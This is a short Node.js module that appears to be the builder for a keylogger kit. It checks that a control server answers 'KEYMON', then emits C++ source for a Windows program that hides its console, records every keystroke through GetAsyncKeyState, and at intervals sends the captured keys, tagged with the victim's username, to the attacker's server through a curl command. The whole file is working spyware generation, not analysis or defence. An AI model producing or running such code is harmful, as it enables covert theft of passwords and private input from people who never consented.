const { default: axios } = require('axios')


module.exports = {
    createLogger: async function ({ id, origin, interval }) {
        if (origin.endsWith("/")) origin = origin.slice(0, -1)
        if (!origin.includes("http")) return "Enter valid origin."

        try {
            const response = await axios.get(`${origin}/check`)
            if (response.data != "KEYMON") return "Enter valid origin."
        } catch (error) {
            return error.message
        }

        return `#include <iostream>
#include <windows.h>
using namespace std;
int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    int INTERVAL = ${interval};
    int COUNT = 0;
    string ID = ${id.length == 0 ? 'getenv("USERNAME")' : '"' + id + '"'};
    string URL = "${origin}/t?id=" + ID + "&key=";
    string SSD = "";
    while (true)
    {
        Sleep(10);
        for (int i = 0; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                string code = to_string(i);
                if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                {
                    code = "@" + code;
                }
                SSD += code + ",";
                COUNT++;
                if (INTERVAL == COUNT)
                {
                    string c = "curl -s -X GET \\"" + URL + SSD + "\\"";
                    system(c.c_str());
                    COUNT = 0;
                    SSD = "";
                }
            }
        }
    }
    return 0;
}`
    }
}